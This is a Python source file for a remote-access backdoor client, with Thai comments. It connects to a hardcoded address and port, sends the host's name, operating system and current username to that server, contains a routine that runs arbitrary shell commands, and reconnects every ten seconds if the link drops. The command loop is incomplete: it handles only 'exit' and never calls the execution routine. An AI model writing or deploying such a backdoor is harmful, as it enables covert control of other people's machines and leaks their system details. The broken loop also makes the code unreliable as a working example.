#!/usr/bin/python

import socket
import platform
import getpass
import json
import sys
import subprocess
import time


class BD:
    def __init__(self, ip, port):
        
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

        # ส่งข้อมูลเครื่องไปยัง sv(server)
        system_info = {
            'hostname': socket.gethostname(),
            'os': platform.system() + " " + platform.release(),
            'user': getpass.getuser(),
        }
        self.connect_send(system_info)

    def execute_sys_cmd(self, cmd):
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            try:
                return output.decode('utf-8')
            except UnicodeDecodeError:
                return output.decode('cp1252', errors='replace')
        except subprocess.CalledProcessError as e:
            return f"[-] Error executing command: {str(e)}"

    def connect_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def connect_receive(self):
        json_data = " "
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def run_cmd(self):
        while True:
            try:
                cmd = self.connect_receive()
            

                if cmd[0] == "exit":
                    self.connection.close()
                    sys.exit()



            except Exception as e:
                try:
                    self.connect_send(f"[-] Error during command execution: {str(e)}")
                except:
                    break

if __name__ == "__main__":
    try:
        while True:
            try:
                server_bd = BD("192.168.1.135", 5555)
                server_bd.run_cmd()
            except Exception as e:
                print(f"[-] Error: {str(e)}")
                time.sleep(10)  # รอ 10 วินาทีก่อนลองเชื่อม Server ใหม่
    except KeyboardInterrupt:
        sys.exit()


    